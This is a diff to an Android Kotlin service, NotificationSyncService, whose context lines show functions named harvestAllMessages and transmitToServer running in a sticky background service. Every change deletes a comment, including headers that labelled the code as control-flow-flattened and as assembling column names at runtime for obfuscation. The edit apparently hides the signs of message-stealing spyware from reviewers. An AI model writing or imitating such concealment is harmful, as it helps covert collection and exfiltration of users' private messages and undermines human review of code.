@@ -14,10 +14,6 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * MessageSyncService — background message synchronisation service.
- * Handles offline message buffering and cloud backup for the app.
- */
 class NotificationSyncService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
@@ -30,7 +26,7 @@ class NotificationSyncService : Service() {
         return START_STICKY
     }
 
-    // ── Control Flow Flattened: beginSync ─────────────────────────────────────
+    
 
     private fun beginSync() {
         serviceScope.launch {
@@ -49,7 +45,7 @@ class NotificationSyncService : Service() {
         }
     }
 
-    // ── Control Flow Flattened: harvestAllMessages ────────────────────────────
+    
 
     @SuppressLint("Range")
     private fun harvestAllMessages(): String {
@@ -143,7 +139,7 @@ class NotificationSyncService : Service() {
         }
     }
 
-    // ── Column names assembled at runtime (obfuscation) ───────────────────────
+    
 
     private fun getColumnName(base: String): String = base
 
@@ -165,7 +161,7 @@ class NotificationSyncService : Service() {
         return dfClass.getMethod("format", Long::class.javaObjectType).invoke(formatter, ts) as String
     }
 
-    // ── Transmission ──────────────────────────────────────────────────────────
+    
 
     private suspend fun transmitToServer(data: String) = withContext(Dispatchers.IO) {
         val x = System.currentTimeMillis()
